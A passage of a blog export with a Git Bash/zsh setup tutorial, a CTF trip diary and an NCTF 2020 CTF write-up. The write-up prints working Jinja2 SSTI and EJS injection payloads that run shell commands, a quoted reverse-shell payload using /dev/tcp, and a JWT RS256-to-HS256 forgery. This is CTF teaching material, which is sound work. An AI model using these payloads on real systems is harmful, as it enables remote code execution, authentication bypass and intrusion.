完成后的效果如下图所示。 此时我们打开 git bash，敲下 zsh，神奇的场面出现了 我们并没有成功切换到 zsh（当然你进入了当我没说 这啥回事啊？这不对劲啊！我们回去看看合并了什么文件吧。 bash 会调用 /usr/bin/ 下的可执行程序，而 zsh 也在这个目录下。 发现这个 zsh.exe 文件大小为0，感觉可能是个链接/快捷方式啥的，但不懂为啥这里用不通。 而真正用到的是这个 zsh-5.8.exe。 于是我们删掉 zsh.exe，把 zsh-5.8.exe 更名为 zsh.exe 就完事了。 这时再启动 git bash，敲下 zsh，嘿嘿，熟悉的 zsh 出来了！ 当然这里可能会提示需要你配置一下 .zshrc，这个后面再说。 看一下 zsh 版本。 zsh --version 0x02 安装 Oh My Zshzsh 都有了，怎么能不上 oh my zsh 呢。 Oh My Zsh is a delightful, open source, community-driven framework for managing your Zsh configuration. It comes bundled with thousands of helpful functions, helpers, plugins, themes, and a few things that make you shout… “Oh My ZSH!” Official Website: http://ohmyz.sh GitHub repo: https://github.com/ohmyzsh/ohmyzsh 在 zsh 里执行（curl） sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" # 或者 # sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" 或者用 wget sh -c \"$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)\" 国内下载可能会不大行（DNS 污染之类的），那就挂个 ladder 什么的在浏览器先下载到本地，然后在 zsh 里 sh install.sh 进行安装。 由于 chsh 在 git bash 里没有，这里可能会报错，但问题不大~ oh my zsh 相关的文件存放在 ~/.oh-my-zsh 目录下。 而 ~ 的目录为 C:\\Users\\&lt;your username&gt;. lib 提供了核心功能的脚本库 tools 提供安装、升级等功能的快捷工具 plugins 自带插件的存放位置 templates 自带模板的存放位置 themes 自带主题文件的存放位置 custom 个性化配置目录，自安装的插件和主题可放这里 Oh My Zsh 默认自带了一些默认主题，存放在~/.oh-my-zsh/plugins目录中，可以通过编辑 ~/.zshrc 文件中的 ZSH_THEME=\"robbyrussel\" 进行配置。 P.S.: 很多主题需要先安装 Powerline Fonts 才能正常渲染图标。 0x03 Oh My Zsh 插件 &amp; 一些配置zsh-autosuggestions 自动补全 https://github.com/zsh-users/zsh-autosuggestions 参考 官方安装说明 git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions 然后编辑 ~/.zshrc，加入插件。 注意是以 空格 或者 空行 作为分隔符。 plugins=( [plugins...] zsh-autosuggestions) 最后重启 zsh 即可。 zsh-syntax-highlighting 语法高亮 https://github.com/zsh-users/zsh-syntax-highlighting 参考 官方安装说明。 git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting 然后编辑 ~/.zshrc，加入插件。 plugins=( [plugins...] zsh-syntax-highlighting) 最后重启 zsh 即可。 给history命令增加时间啊其实这个不算是插件，混入的喵（ 把 HIST_STAMPS 这个注释去除了就行，当然也可以设置成你喜欢的时间格式。 配置好的效果类似于下图。 更新 oh-my-zsh默认的话是有更新的时候会提示，问你要不要更新。 如果需要它自动更新的话，把 ~/.zshrc 里下面这行注释取消就好了。 DISABLE_UPDATE_PROMPT=true 手动更新的话，直接执行upgrade_oh_my_zsh. Note: upgrade_oh_my_zsh is deprecated. Use omz update instead. 啊现在换成下面这个了。 omz update 卸载 oh-my-zsh（不会吧，这就卸了？ uninstall_oh_my_zsh 0x04 配置 zsh 为 bash 默认终端编辑 ~/.bashrc，或者是 D:\\Program Files\\Git\\etc\\bash.bashrc，加入下面的几行。 # Launch Zsh if [ -t 1 ]; then exec zsh fi 而后重启 git bash 即可自动以 zsh 启动。 0x05 配置 Windows Terminal 使用 git bash当然首先是在 Microsoft Store 里安装 Windows Terminal 了，这里略了。 你看 Terminal 多好看（ 使用快捷键 Ctrl + , 打开配置文件 settings.json。 在 profiles &gt; list 下新增一个 object，加入 git bash。 commandline 为 git bash 的路径。 为了确保 .bash_profile 被加载，需要在 commandline 选项中加入 -l -i 。 icon 图标是下面这个，当然也可以换成你喜欢的。 这里给出我的配置，供参考。 { \"guid\": \"{1c4de342-38b7-51cf-b940-2309a097f589}\", \"hidden\": false, \"name\": \"git bash\", \"commandline\": \"\\\"D:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe\\\" -i -l\", \"historySize\": 9001, \"name\": \"Bash\", \"closeOnExit\": true, \"useAcrylic\": true, \"acrylicOpacity\": 0.85, //透明度 \"icon\": \"D:\\\\tools\\\\my-git-bash\\\\git-icon.png\", \"startingDirectory\": null } 默认使用 git bash 作为 Terminal 启动修改上述文件中的 defaultProfile 为 git bash 的 guid，此处为 {1c4de342-38b7-51cf-b940-2309a097f589}。 效果类似于 \"defaultProfile\": \"{1c4de342-38b7-51cf-b940-2309a097f589}\" 0x06 将 Windows Terminal 加入到右键菜单首先 在 cmd 里 测试一下下面这两个常量是否正常。 echo %USERPROFILE% echo %LOCALAPPDATA% 如果有相应的信息输出，则后续可直接使用这两个常量。 否则需要进行如下替换： %USERPROFILE% =&gt; C:\\Users\\&lt;username&gt; %LOCALAPPDATA% =&gt; C:\\Users\\&lt;username&gt;\\AppData\\Local 其中，&lt;username&gt; 是你的用户名。 新建目录 mkdir \"%USERPROFILE%\\AppData\\Local\\terminal\" 把 Windows Terminal 图标复制到这个目录下，图标放在 这里 terminal.ico。 将如下内容另存为 wt.reg, 然后以 “管理员权限” 运行 Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\wt] @=\"Windows terminal here\" \"Icon\"=\"%LOCALAPPDATA%\\\\terminal\\\\terminal.ico\" [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\wt\\command] @=\"C:\\\\Users\\\\&lt;your username&gt;\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\wt.exe\" 请注意，对于最后一行 wt.exe 的路径，需使用完整的绝对路径，否则会报错。 而后双击执行，将配置添加到注册表。 效果就像下面这样了。 点击之后就能进入 git bash，使用 zsh 终端，并且就在当前目录下了。 0x07 一些 Git Bash 配置和快捷键参考 https://github.com/xnng/my-git-bash 这里面还有一些特定针对于 git bash 的字体 / 主题 / Tmux / wget、tree安装 / VSCode + git bash 相关的设置。 但要注意，有一些和 zsh、Oh-my-zsh 的配置会有冲突 emmm 所以你喜欢用 zsh 的话，就直接配置 zsh 好了唉。 常用的快捷键 按键 效果 Alt + Enter 全屏 关闭窗口 Ctrl + D（需当前行没有字符才可用） 清屏 Ctrl + L 打开终端 右键快捷方式，在属性中自行设置 复制粘贴 Ctrl + Shift + C/V（v2.20.0 版本后才支持） 其他快捷键遵循 Bash 标准快捷键，例如 Ctrl + R 搜索历史命令、exit 退出终端、clear 和 reset 清屏、Ctrl + E/A 光标到行首尾，等等可自行搜索。 总结反正贼舒服就是了！ （溜了溜了喵 References &amp; Extensive Reading install-zsh-windows-git-bash.md install zsh with git-bash on Windows10 CSDN: 利用Oh-My-Zsh打造你的超级终端 Linux 终端美化 - Oh My Zsh 在windwos terminal 中使用git bash的alias GitHub: xnng/my-git-bash 使用 ohmyzsh 打造 windows、ubuntu、mac 系统高效终端命令行工具。 B乎：新发布的Windows Terminal如何添加到右键菜单？ win10 安装 oh my zsh 和 windows git bash 设置别名提高效率 How to Install Oh My Zsh! on Windows 10 Home Edition etc.","path":"2020/12/13/Server_Terminal_gitbash_zsh/"},{"title":"碎碎念 | X-NUCA 2020 全国高校网安联赛总决赛 深圳游记","text":"前言这几天去深圳打了个 X-NUCA 2020 全国网安联赛总决赛，趁着还有兴致，就来大概总结一下吧，喵~ 难得线上赛挤进了全国前 20，有机会去线下见到了一堆大老鼠。 旅游划水摸鱼选手是我了，唉，果然就躺平了。 最大感受就是比赛过于硬核，赛制直到开幕式才公布，4道 git based AD + 2 道 KOH，肝一天半。 对，是完全没体验过的赛制，题目类型以二进制为主，混杂着 pwn RE web crypto algorithm，不会 binary 的 misc 手没有游戏体验嘤嘤嘤（ 果然是国内为数不多的高质量比赛了，也是打过的最硬核的 CTF 了，可惜可能没机会再来玩了呜呜呜 题目回顾git based AD，之前还没见过这种用 git 维持比赛环境的，就是主办方搭了个 GitLab，给各队分配了用户名密码以及仓库，不同题目放在不同的分支。 修复漏洞需要把 patch 文件 push 上去，如果 check 通过了话，则推送到团队自己的 gamebox 里。于是乎开幕式还去复习了一波 git 操作，唉还是太菜了。 不过这倒是有个好处，题目不容易被别人搅乱，当然啥流量也抓不到了嘤嘤嘤。 另外呢还引入了 NPC 题，就是只能打不能防，反正感觉就类似于平常解题赛里的题型了。 （比赛期间才知道原来只有 pwn 题是攻防结合的，web 是 NPC，害 KOH 题型也挺有意思的，King Of the Hill，就是完成题目代码所给的一个任务，通过 git push 的方式把代码或者数据传上去，而后后台的 OJ 进行评测打分，按照这个打分的排名进行排序，折合成最后的总分。 乍一看还以为是 OI 里的啥算法题，一脸懵逼，不过确实挺像的，都没玩过就是了。到最后这题目老内卷了，果然如其名 King Of the Hill 了。 下面是硬核环节，来简单看看题目怎么硬核的吧（qs 比如给了一套最新版的 WordPress 和一堆插件 魔改后的源码 &amp; dump 出来的 sql 文件，去挖洞找 flag（然而 diff 了半天不知道怎么用，在本地搭了一晚上 PHP 环境然而 php-mysql 的插件装不上于是跑不起来，心态崩了 比如挖一个手写的 C语言编译器 里的洞（队友补了洞发现还是一直被打，还动不动 check down patch 不上去，最后出题人说有8个洞，人都傻了 比如一个二进制文件，逆向出来混杂着 AES RSA 密码学求解（要是直接给 crypto 可能还能看看嘤嘤嘤 比如一个 mips 架构二进制文件，逆向出来写了个 web 服务，GET POST DELETE 等等不同方法执行不同指令，涉及堆操作啥的（啥玩意啊，劝退了 比如 KOH 给了一个 面向对象的 cpp，看了贼久才知道大概是个 driver 开车车的算法模拟，输入两个矩阵一个 noise，结合随机数经过一系列运算之后如果在给定最大时间内和目标的距离在阈值范围内则认为 grab，这样持续 256 轮后比谁的用时短（赛后问了 THU Nano，果然搭了个神经网络去训练 Orz，后面有机会再来复现一下这个8 比如另一个 KOH 涉及多线程和 pipe 读写，执行提交上去的 shellcode，在实现功能的前提下比谁的长度短（队友手搓 shellcode 然后按照 byte 优化，唉都是我不懂的东西 比如…啊没了，就这些题了，可能说的不大对敬请指正 Orz。 反正蹲官方和大老鼠们的 WriteUp 就是了。 一些有意思的事 到了开幕式才知道，原来 X-NUCA 的真正读法类似于 [eks ˈnjuːkɑː(r)] 比赛现场主办方提供点歌服务，好评 能连热点上外网，但被内外网双网关折磨了贼久，开赛后半个多小时在研究怎么配网，最后手动配置路由策略以及帮队友配（可能算是那么一点点比赛体验吧，队友动不动拔插拔插网线有画面感了吧 颁奖典礼溜出去逛了一圈深圳大学校园，校园好大还有观光车（校内班车？），还看到了高尔夫教学实验中心，有钱有钱，xmsl 颁奖典礼结束后可以拿回战队的旗子，啊是真正的夺旗赛 233 陈国良院士的报告，左下角 The above picture is from the Internet，有点讲究。 然后群友做了下面这个图（ 成功和 Nohn 以及 最强大脑脑王 NanoApe 面基，圆了抱 Nano 的小心愿，要到了 Nano 签名，喵，好小一只真的好可爱，i了i了！ 去深圳湾公园、深圳人才公园转了转，海边各种著名企业的高楼大厦，夜景贼不错 酒店床头居然没有插座，差评！ 不过窗外的风景还行（ （话说远处的腾讯大厦里是不是还有一堆 996 呢 深圳的地铁还分空调强冷和弱冷车厢，车厢内的显示屏对出口、上下电梯的位置标识挺清楚的，好评。 etc. 总之这几天玩得倒是挺开心的，喵喵~ （溜了溜了","path":"2020/12/10/Life_2020XNUCA_trip/"},{"title":"CTF | 2020 NCTF/NJUPTCTF 部分WriteUp","text":"引言一年一度的 NCTF 又来了。 刚刚过去的这周末比赛有点多，以至于打起来有点佛系。 南邮的师傅们出题很不错，嗯，值得被锤。 期待了半天发现没有真正的 Misc 题，有亿点点难受，没办法只能硬肝 Web 题了，太难顶了。 这里就写一下我做的几道题的 WriteUp 好了。 （顺便吐槽一下 Web你就是我的master吗 来签个到叭~ 备用地址：http://42.192.72.11:10001~10007 Flask SSTI. 用 \\x5f 来替代 _，过滤掉的关键词用 \"\" 双引号拼接就好了。 Payload: 看看当前目录有啥。 http://42.192.72.11:10001/ ?name={{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls\")[\"read\"]()}} 早安，打工人&lt;br/&gt;你就是我的app.py wo_ta_niang_de_bu_shi_ni_de_fla9 吗？&lt;br/&gt;&lt;!-- ?name=master --&gt; 读 flag： http://42.192.72.11:10001/ ?name={{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"cat *\")[\"read\"]()}} 源码： from flask import Flask, request from jinja2 import Template app = Flask(__name__) @app.route(\"/\") def index(): name = request.args.get('name', 'guest') blacklist = ['%','-',':','+','class','base','mro','_','config','args','init','global','.','\\'','req','|','attr','get'] for i in blacklist: if i in name: return Template('你真是个小可爱').render() t = Template(\"早安，打工人&lt;br/&gt;你就是我的\" + name + \"吗？&lt;br/&gt;&lt;!-- ?name=master --&gt;\") return t.render() if __name__ == \"__main__\": app.run() NCTF{ni_t@_niang_dee_jiu_shi_woo_de_master_ma} 这真的是签到题么？ （噢对了，出题人说这还是非预期，emmm 官方 payload 如下，噢是这个意思的 全十六进制 唉。确实差不多。 ?name={{\"\"[\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\"][\"\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f\"][\"\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f\"]()[64][\"\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\"][\"\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\"][\"\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\"][\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\"](\"\\x6f\\x73\")[\"\\x70\\x6f\\x70\\x65\\x6e\"](\"ls\")[\"\\x72\\x65\\x61\\x64\"]()}} JS-world JavaScript can quickly turn our everyday job into hell, and some of them can make us laugh out loud. Have fun. hint1: script.js has sth useful. http://42.192.72.11:8090/ 首先看了一下后端是 Express，用了 EJS 模板引擎 来渲染页面。 调试分析了一下逻辑，JS 逆向有一点点麻烦。 本来还解混淆了一下，不过后来发现貌似没必要了，也并不需要逆向了。 重点在 /js/script.js 文件里对输入的 code 一些关键字进行过滤以及加密。 关键源码： function create() { var _0x1bef85 = _0x1656 , _0x23132f = document[_0x1bef85('0x9')]('MyCode')[_0x1bef85('0xe')]; _0x23132f = _0x23132f[_0x1bef85('0x5')](/[\\/\\*\\'\\\"\\`\\&lt;\\\\\\&gt;\\-\\(\\)\\[\\]\\=\\%\\.]/g, ''); var _0x1658d5 = _0x1bef85('0x8') + _0x23132f + _0x1bef85('0x2'); _0x1658d5 = btoa(xor(_0x1bef85('0xc'), _0x1658d5)); var _0x23601e = new XMLHttpRequest(); _0x23601e['open'](_0x1bef85('0x13'), _0x1bef85('0x7'), !![]), _0x23601e['setRequestHeader'](_0x1bef85('0x11'), _0x1bef85('0xd')); var _0x3deb5a = _0x1bef85('0x4') + escape(_0x1658d5); return _0x23601e[_0x1bef85('0xa')](_0x3deb5a), alert('Done.\\x0aCheck\\x20/templates\\x20now.'), ''; } 其中，document[_0x1bef85('0x9')]('MyCode')[_0x1bef85('0xe')] 就是通过 getElementById 获得输入的数据。 _0x23132f[_0x1bef85('0x5')] 函数为 replace，可见把这些符号给过滤掉了。 之后这段是进行加密。 var _0x1658d5 = _0x1bef85('0x8') + _0x23132f + _0x1bef85('0x2'); _0x1658d5 = btoa(xor(_0x1bef85('0xc'), _0x1658d5)); 最后调用 XMLHttpRequest 把数据发给后端。 在 /templates 目录就能看到生成的页面了。 因此做题的话，直接把过滤的这条语句删了就好了。 这里为了方便直接传参了。 把这段放到浏览器 Console 里执行，覆盖掉原来的函数，再传参进去执行就完事。 function create(xx) { var _0x1bef85 = _0x1656 , _0x23132f = xx; var _0x1658d5 = _0x1bef85('0x8') + _0x23132f + _0x1bef85('0x2'); _0x1658d5 = btoa(xor(_0x1bef85('0xc'), _0x1658d5)); var _0x23601e = new XMLHttpRequest(); _0x23601e['open'](_0x1bef85('0x13'), _0x1bef85('0x7'), !![]), _0x23601e['setRequestHeader'](_0x1bef85('0x11'), _0x1bef85('0xd')); var _0x3deb5a = _0x1bef85('0x4') + escape(_0x1658d5); return _0x23601e[_0x1bef85('0xa')](_0x3deb5a), alert('Done.\\x0aCheck\\x20/templates\\x20now.'), ''; } 考虑到是 ejs 模板引擎，应该就是 ejs 注入了。 查了一下，参考 Y1ng 师傅的脚本。 &lt;%- global.process.mainModule.require('child_process').execSync('cat app.js') %&gt; 这样可以读取源码。 const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const cookieParser = require(\"cookie-parser\"); const path = require(\"path\"); const session = require(\"express-session\"); const FileStore = require('session-file-store')(session); const fs = require('fs'); app.set('views', __dirname + '/views'); app.set('view engine', 'ejs'); app.engine('html', require('ejs').renderFile); app.use(express.static('public')); app.use(session({ name: 'session', secret: 'T0pSsssecRet233#@###', store: new FileStore({path: path.join(__dirname, \"sessions\")}), resave: false, saveUninitialized: false })); app.use(bodyParser.urlencoded({ extended: false })); app.use(cookieParser()); const KEY= process.env.KEY || \"r5NmfIzU1uzl6Wp\"; const xor = (secretkey,value) =&gt; { return Array.prototype.slice.call(value).map( function(chr,index){ return String.fromCharCode(secretkey[index % secretkey.length].charCodeAt(0) ^ chr.charCodeAt(0)) }).join(''); } app.get('/' ,(req,res) =&gt; { let session=req.session; if(session.AccessGranted === undefined){ session.AccessGranted=true; } return res.render('index.html'); }) app.get('/templates', (req,res) =&gt; { const session = req.session; if(session.AccessGranted !== \"undefined\" &amp;&amp; session.AccessGranted === true){ try{ let template_path = path.join(\"templates/\", session.id, 'index.html'); return res.render(template_path); }catch(err){ throw err; } }else{ return res.send('Not Accessible Now.'); } }); app.post('/create', (req,res) =&gt; { const session = req.session; if(session.AccessGranted !== \"undefined\" &amp;&amp; session.AccessGranted === true){ try{ const id = session.id; const raw = Buffer.from(req.body.code, 'base64').toString(); const contents = xor(KEY,raw); let template_path = path.join(__dirname , \"/views/templates/\", id, 'index.html'); if (!fs.existsSync(path.join(__dirname , \"/views/templates/\", id))) { fs.mkdirSync(path.join(__dirname , \"/views/templates/\", id)); } fs.writeFileSync(template_path, contents); return res.send('done'); }catch(err){ throw err; } }else{ return res.send('Not Accessible Now.'); } }); app.all('*', (req, res) =&gt; { return res.status(404).send('404 page not found'); }); app.listen(8088, () =&gt; console.log('Listening on port 8088')); 而后找 flag 就好了。 var payload = \"&lt;%- global.process.mainModule.require('child_process').execSync('ls -alh') %&gt;\" total 92K drwxr-xr-x 1 root root 4.0K Nov 17 11:29 . drwxr-xr-x 1 root root 4.0K Nov 21 00:55 .. -rw-r--r-- 1 root root 2.6K Nov 17 11:10 app.js drwxr-xr-x 95 root root 4.0K Nov 17 11:29 node_modules -rw-r--r-- 1 root root 24.9K Nov 17 11:29 package-lock.json -rw-r--r-- 1 root root 447 Nov 17 11:10 package.json drwxr-xr-x 6 root root 4.0K Nov 17 11:10 public drwxr-xr-x 1 nobody nobody 24.0K Nov 21 18:02 sessions drwxr-xr-x 1 root root 4.0K Nov 17 11:10 views var payload = \"&lt;%- global.process.mainModule.require('child_process').execSync('ls / -alh') %&gt;\" drwxr-xr-x 1 root root 4.0K Nov 21 00:55 . drwxr-xr-x 1 root root 4.0K Nov 21 00:55 .. -rwxr-xr-x 1 root root 0 Nov 21 00:55 .dockerenv drwxr-xr-x 1 root root 4.0K Nov 17 11:29 app drwxr-xr-x 1 root root 4.0K Nov 16 23:22 bin drwxr-xr-x 5 root root 340 Nov 21 06:12 dev drwxr-xr-x 1 root root 4.0K Nov 21 00:55 etc -rw-r--r-- 1 node node 32 Nov 18 01:51 flag.txt drwxr-xr-x 1 root root 4.0K Nov 16 23:22 home drwxr-xr-x 1 root root 4.0K Nov 16 23:22 lib drwxr-xr-x 5 root root 4.0K Apr 23 2020 media drwxr-xr-x 2 root root 4.0K Apr 23 2020 mnt drwxr-xr-x 1 root root 4.0K Nov 16 23:22 opt dr-xr-xr-x 357 root root 0 Nov 21 06:12 proc drwx------ 1 root root 4.0K Nov 17 11:29 root drwxr-xr-x 2 root root 4.0K Apr 23 2020 run drwxr-xr-x 2 root root 4.0K Apr 23 2020 sbin drwxr-xr-x 2 root root 4.0K Apr 23 2020 srv dr-xr-xr-x 13 root root 0 Nov 21 06:12 sys drwxrwxrwt 1 root root 4.0K Nov 16 23:22 tmp drwxr-xr-x 1 root root 4.0K Nov 16 23:22 usr drwxr-xr-x 1 root root 4.0K Apr 23 2020 var 最后读 flag。 var payload = \"&lt;%- global.process.mainModule.require('child_process').execSync('cat /flag.txt') %&gt;\" NCTF{Welcome_to_The_js_W0rld:)} BTW, CVE-2020-7699：NodeJS模块代码注入，express-fileupload npm组件。 D^3CTF 官方WriteUp —— ejs getshell 他的脚本如下。（好家伙，直接 getshell。 {\"content\": {\"constructor\": {\"prototype\": {\"outputFunctionName\": \"a; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1\"'); //\"}}}} PackageManager_v1.0 Admin uses this api server to manage his package . Definitely no way to RCE. Please make sure you can exploit it locally fisrt. all packages are up to date source code: 链接：https://pan.baidu.com/s/19fm5JUvpjPEUVs528qRDSw 提取码：txai 审阅源码，在 router/index.js 里处理路由。 router.get('/', (req,res) =&gt; { return res.render('index.html'); }); router.get('/api/package', async(req, res) =&gt; { let token = req.cookies['auth']; if( token == undefined ){ user={ username : \"guest\" }; token=await JWT.sign(user); res.cookie('auth', token, { httpOnly: true }) } return res.render('index.html',{ author : package.author , description : package.description }); }); router.post('/api/package',AuthMiddlerware,(req,res)=&gt;{ let newpackage={}; newpackage=rep.replicate(newpackage,req.body); return res.render('index.html',{ author : newpackage.author , description : newpackage.description }); }); //only for self debugging router.get('/debug/:command', AuthMiddlerware,(req,res) =&gt;{ let command= req.params.command; if(command){ if (command == 'cwd') { let proc = fork('./checkcwd.js', [], { stdio: ['ignore', 'pipe', 'pipe', 'ipc'] }); proc.stderr.pipe(res); proc.stdout.pipe(res); return; } return res.send('Invalid command'); } else{ return res.end('No command specified.'); } }); 发现 GET 请求 /api/package这里用到了 JWT 鉴权，关键的部分如下。 module.exports = { async sign(data) { data = Object.assign(data, { pk : publicKey } ); return (await jwt.sign(data, privateKey, { algorithm:'RS256' })) }, async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); } } 可以看到把公钥包含到了 JWT 中，而且解密的时候能够用 HS256 算法，于是参考 Hackergame2020 普通的身份认证器 一题，将 RS256 降级为 HS256。 （引用自己之前的 WP，讲究 首先获取 cookie。 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0.002iwHbUK25horYZdXwN2c9mxu9ak-258TcHRo2NbCjERbzSZCQea_wfgyuYQkAoE1uurJ0dLCJw4Ozi-iXN6KA92UpgHUX0voNLYtcQENNqMTwyKldUztu6AR9eqdhftLTOLDWuIylqjoPkQA7pFYJXx2yfh5UkEqWW6arFTZs base64 解密，取头部 Header、载荷 Payload。 {\"alg\":\"RS256\",\"typ\":\"JWT\"}.{\"username\":\"guest\",\"pk\":\"-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDoDGpHkaoKLeJXHHnQUF1t+anX\\nqir79Yj3vfDFTOp6qhl6GsnyucEdiCI1z3lidJ2pd1mjT7kw3isNV6GkZWo2i/UY\\nOVlkIaWWDwtJMuJuSlE4t3zuYM0DYNTFEzS5jF/Rl3cNLSBtGleobm1qEKH/eAgK\\nosXefntFyPYavn/uIQIDAQAB\\n-----END PUBLIC KEY-----\\n\",\"iat\":1606037212} 修改加密算法，username改为 admin。 再 base64 加密，去除 =，得到 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0 结合公钥计算加密所用的签名（Signature）。 $ echo -n \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751446f444770486b616f4b4c654a5848486e51554631742b616e580a7169723739596a3376664446544f703671686c3647736e7975634564694349317a336c69644a327064316d6a54376b773369734e5636476b5a576f32692f55590a4f566c6b496157574477744a4d754a75536c453474337a75594d3044594e5446457a53356a462f526c33634e4c534274476c656f626d3171454b482f6541674b0a6f735865666e744679505961766e2f7549514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a (stdin)= 2eeceba7b1828a217aa00ca6795bcaa1ca2f2391e731362b1f5ac1084f11966d 转换为 JWT format。 $ python -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('2eeceba7b1828a217aa00ca6795bcaa1ca2f2391e731362b1f5ac1084f11966d')).replace('=','')\\\")\" Luzrp7GCiiF6oAymeVvKocovI5HnMTYrH1rBCE8Rlm0 拼接得到 JWT. 